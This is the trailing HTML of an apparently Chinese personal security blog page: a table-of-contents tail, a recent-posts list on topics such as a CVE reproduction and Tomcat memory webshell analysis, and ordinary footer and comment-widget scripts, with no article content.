class="toc-text">漏洞探究</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B0%8F%E7%BB%93"><span class="toc-number">3.</span> <span class="toc-text">小结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">4.</span> <span class="toc-text">参考</span></a></li></ol></div></div></div><div class="card-widget card-recent-post"><div class="card-content"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2024/03/10/CVE-2021-42550%E5%A4%8D%E7%8E%B0/" title="CVE-2021-42550漏洞复现"><img src="https://techterms.com/img/sm/cve_1618.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CVE-2021-42550漏洞复现"/></a><div class="content"><a class="title" href="/2024/03/10/CVE-2021-42550%E5%A4%8D%E7%8E%B0/" title="CVE-2021-42550漏洞复现">CVE-2021-42550漏洞复现</a><time datetime="2024-03-10T06:54:43.353Z" title="发表于 2024-03-10 14:54:43">2024-03-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/03/10/webview%20%20intent%20uxss/" title="webview intent uxss"><img src="https://miro.medium.com/v2/resize:fit:828/format:webp/1*WwN78iOX-HC74T9AHGxjOg.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="webview intent uxss"/></a><div class="content"><a class="title" href="/2024/03/10/webview%20%20intent%20uxss/" title="webview intent uxss">webview intent uxss</a><time datetime="2024-03-10T06:54:17.108Z" title="发表于 2024-03-10 14:54:17">2024-03-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/03/10/%E5%9F%BA%E4%BA%8ETomcat%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/" title="基于Tomcat的内存马分析"><img src="https://picx.zhimg.com/70/v2-fd69dc15d82e0d4b54cfba25e7e15443_1440w.avis?source=172ae18b&amp;biz_tag=Post" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="基于Tomcat的内存马分析"/></a><div class="content"><a class="title" href="/2024/03/10/%E5%9F%BA%E4%BA%8ETomcat%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/" title="基于Tomcat的内存马分析">基于Tomcat的内存马分析</a><time datetime="2024-03-10T06:53:39.202Z" title="发表于 2024-03-10 14:53:39">2024-03-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/03/10/Tomcat%E6%9E%B6%E6%9E%84/" title="Tomcat架构"><img src="https://images.ytao.top/tomcat.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Tomcat架构"/></a><div class="content"><a class="title" href="/2024/03/10/Tomcat%E6%9E%B6%E6%9E%84/" title="Tomcat架构">Tomcat架构</a><time datetime="2024-03-10T06:53:39.200Z" title="发表于 2024-03-10 14:53:39">2024-03-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/11/28/%E4%B8%80%E6%96%87%E6%90%9E%E6%87%82DEX%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/" title="一文搞懂DEX文件结构"><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/20211201164619.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="一文搞懂DEX文件结构"/></a><div class="content"><a class="title" href="/2023/11/28/%E4%B8%80%E6%96%87%E6%90%9E%E6%87%82DEX%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/" title="一文搞懂DEX文件结构">一文搞懂DEX文件结构</a><time datetime="2023-11-28T08:48:58.520Z" title="发表于 2023-11-28 16:48:58">2023-11-28</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 <i id="heartbeat" class="fa fas fa-heartbeat"></i> dummersoul</div><div class="framework-info"><!--span= _p('footer.framework') + ' '--><!--a(href='https://hexo.io')= 'Hexo'--><!--span.footer-separator |--><!--span= _p('footer.theme') + ' '--><!--a(href='https://github.com/jerryc127/hexo-theme-butterfly')= 'Butterfly'--></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div></div><hr/><div id="local-search-results"><div id="local-hits"></div><div id="local-stats"><div class="local-search-stats__hr" id="hr"><span>由</span> <a target="_blank" rel="noopener" href="https://github.com/wzpan/hexo-generator-search" style="color:#49B1F5;">hexo-generator-search</a>
+ <span>提供支持</span></div></div></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>(()=>{
+  let setting = {
+    appId: '',
+    appKey: '',
+  }
+
+  if (false) {
+    const otherSetting = false
+    setting = Object.assign({}, setting, otherSetting)
+  }
+
+  const init = () => {
+    new Artitalk(setting)
+  }
+
+  if (typeof Artitalk === 'function') {
+    init()
+  } else {
+    $.getScript('https://cdn.jsdelivr.net/npm/artitalk',init)
+  }
+})()</script><script>function loadValine () {
+  function initValine () {
+    let initData = {
+      el: '#vcomment',
+      appId: 'n3p3uLQDNt0AhK7HstJIX6hw-gzGzoHsz',
+      appKey: 'DzduWleTzfwsWV48PWO1wi1d',
+      placeholder: '留下你的昵称和邮箱，可以快速得到回复哦~',
+      avatar: 'monsterid',
+      meta: 'nick,mail,link'.split(','),
+      pageSize: '10',
+      lang: 'zh-CN',
+      recordIP: true,
+      serverURLs: '',
+      emojiCDN: '//i0.hdslb.com/bfs/emote/',
+      emojiMaps: {"tv_doge":"6ea59c827c414b4a2955fe79e0f6fd3dcd515e24.png","tv_亲亲":"a8111ad55953ef5e3be3327ef94eb4a39d535d06.png","tv_偷笑":"bb690d4107620f1c15cff29509db529a73aee261.png","tv_再见":"180129b8ea851044ce71caf55cc8ce44bd4a4fc8.png","tv_冷漠":"b9cbc755c2b3ee43be07ca13de84e5b699a3f101.png","tv_发怒":"34ba3cd204d5b05fec70ce08fa9fa0dd612409ff.png","tv_发财":"34db290afd2963723c6eb3c4560667db7253a21a.png","tv_可爱":"9e55fd9b500ac4b96613539f1ce2f9499e314ed9.png","tv_吐血":"09dd16a7aa59b77baa1155d47484409624470c77.png","tv_呆":"fe1179ebaa191569b0d31cecafe7a2cd1c951c9d.png","tv_呕吐":"9f996894a39e282ccf5e66856af49483f81870f3.png","tv_困":"241ee304e44c0af029adceb294399391e4737ef2.png","tv_坏笑":"1f0b87f731a671079842116e0991c91c2c88645a.png","tv_大佬":"093c1e2c490161aca397afc45573c877cdead616.png","tv_大哭":"23269aeb35f99daee28dda129676f6e9ea87934f.png","tv_委屈":"d04dba7b5465779e9755d2ab6f0a897b9b33bb77.png","tv_害羞":"a37683fb5642fa3ddfc7f4e5525fd13e42a2bdb1.png","tv_尴尬":"7cfa62dafc59798a3d3fb262d421eeeff166cfa4.png","tv_微笑":"70dc5c7b56f93eb61bddba11e28fb1d18fddcd4c.png","tv_思考":"90cf159733e558137ed20aa04d09964436f618a1.png","tv_惊吓":"0d15c7e2ee58e935adc6a7193ee042388adc22af.png"},
+      enableQQ: false,
+      path: window.location.pathname,
+    }
+
+    if (true) { 
+      initData.requiredFields= ('nick,mail'.split(','))
+    }
+    
+    if (false) {
+      const otherData = false
+      initData = Object.assign({}, initData, otherData)
+    }
+    
+    const valine = new Valine(initData)
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else $.getScript('https://cdn.jsdelivr.net/gh/HCLonely/Valine@latest/dist/Valine.min.js', initValine)
+}
+
+if ('Valine' === 'Valine' || !true) {
+  if (true) btf.loadComment(document.querySelector('#vcomment'),loadValine)
+  else setTimeout(() => loadValine(), 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><script src="/js/third-party/switch_comments.js"></script><script defer="defer" id="fluttering_ribbon" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-fluttering-ribbon.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/click-heart.min.js" async="async" mobile="false"></script><script src="//code.tidio.co/cqinyzbakrsti8bz4wjlaffn3gkjplgj.js" async="async"></script><script>(function(){
+  const bp = document.createElement('script');
+  const curProtocol = window.location.protocol.split(':')[0];
+  if (curProtocol === 'https'){
+  bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+  }
+  else{
+  bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+  }
+  bp.dataset.pjax = ''
+  const s = document.getElementsByTagName("script")[0];
+  s.parentNode.insertBefore(bp, s);
+})()</script></div></body></html>
